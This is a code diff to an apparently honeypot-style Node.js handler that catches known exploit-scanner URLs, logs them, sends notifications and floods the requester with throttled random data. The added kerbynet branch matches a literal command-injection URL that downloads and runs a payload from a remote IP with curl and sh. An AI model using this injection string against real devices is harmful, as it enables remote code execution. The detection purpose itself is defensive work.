@@ -15,6 +15,7 @@ module.exports = function trollsf(req, res, rrid, ipaddr, proto, url, cookies, n
   if (req.url.startsWith('/?a=fetch&content=')) {
     // apparantly ips will request this type of url to have the server echo back the HTML and PHP given, must be a security vulnerability
     let content = req.url.slice(18, Infinity);
+    if (datajs.feat.notify) notifier.notify({ title: 'Troll Underway', message: 'php execution' });
     console.log('Fetching "content" (may be PHP 😜): ' + content);
     // give them some "content"
     res.writeHead(200, {'Content-Type': 'text/html'});
@@ -39,6 +40,7 @@ module.exports = function trollsf(req, res, rrid, ipaddr, proto, url, cookies, n
     req.on('data', c => data.push(c));
     req.on('end', () => {
       data = Buffer.concat(data);
+      if (datajs.feat.notify) notifier.notify({ title: 'Troll Underway', message: 'phpstorm' });
       console.log('Someone wants to debug (phpstorm)');
       console.log(data);
       console.log(util.inspect(data.toString()));
@@ -64,6 +66,7 @@ module.exports = function trollsf(req, res, rrid, ipaddr, proto, url, cookies, n
     req.on('data', c => data.push(c));
     req.on('end', () => {
       data = Buffer.concat(data).toString();
+      if (datajs.feat.notify) notifier.notify({ title: 'Troll Underway', message: 'jsonws invoke' });
       console.log('Getting JSON data 😜 (jsonws invoke)');
       console.log(util.inspect(data));
       // gives client 512MiB+ garbage data
@@ -83,6 +86,7 @@ module.exports = function trollsf(req, res, rrid, ipaddr, proto, url, cookies, n
     req.on('data', c => data.push(c));
     req.on('end', () => {
       data = Buffer.concat(data).toString();
+      if (datajs.feat.notify) notifier.notify({ title: 'Troll Underway', message: 'solr admin info' });
       console.log('Getting admin JSON data 😜 (solr admin info)');
       console.log(util.inspect(data));
       // gives client 512MiB+ garbage data
@@ -102,6 +106,7 @@ module.exports = function trollsf(req, res, rrid, ipaddr, proto, url, cookies, n
     req.on('data', c => data.push(c));
     req.on('end', () => {
       data = Buffer.concat(data);
+      if (datajs.feat.notify) notifier.notify({ title: 'Troll Underway', message: 'phpunit eval-stdin' });
       console.log('Someone wants to execute some code (phpunit eval-stdin)');
       console.log(data);
       console.log(util.inspect(data.toString()));
@@ -127,6 +132,7 @@ module.exports = function trollsf(req, res, rrid, ipaddr, proto, url, cookies, n
     req.on('data', c => data.push(c));
     req.on('end', () => {
       data = Buffer.concat(data);
+      if (datajs.feat.notify) notifier.notify({ title: 'Troll Underway', message: 'w00t w00t' });
       console.log('Someone wants to WOOT WOOT (w00tw00t)');
       console.log(data);
       console.log(util.inspect(data.toString()));
@@ -146,5 +152,29 @@ module.exports = function trollsf(req, res, rrid, ipaddr, proto, url, cookies, n
       res.stream_rand.on('error', () => console.log('error in w00tw00t'));
     });
     return 1;
+  } else if (req.url == '/cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22') {
+    let data = [];
+    req.on('data', c => data.push(c));
+    req.on('end', () => {
+      data = Buffer.concat(data);
+      if (datajs.feat.notify) notifier.notify({ title: 'Troll Underway', message: 'cgi-bin' });
+      console.log('Someone wants to cgi-bin');
+      console.log(data);
+      console.log(util.inspect(data.toString()));
+      // bomdard with 1GiB random data
+      res.writeHead(200, {'Content-Type': 'text/plain'});
+      let seedfunc = datajs.prng.xmur3(new Date().toISOString());
+      res.stream_rand = new datajs.s.RandomStream(
+        2 ** 32, 
+        {randbytesfunc: datajs.prng.sfc32_multifunc(
+          seedfunc(), seedfunc(), seedfunc(), seedfunc()
+        ).randomBytes}
+      );
+      res.stream_rand.pipe(res.stream_throttle = new datajs.Throttle({bps: 2 ** 20}));
+      res.stream_throttle.pipe(res);
+      res.stream_rand.on('end', () => console.log('finished with kerbynet'));
+      res.stream_rand.on('close', () => console.log('kerbynet closed'));
+      res.stream_rand.on('error', () => console.log('error in kerbynet'));
+    });
   }
 };
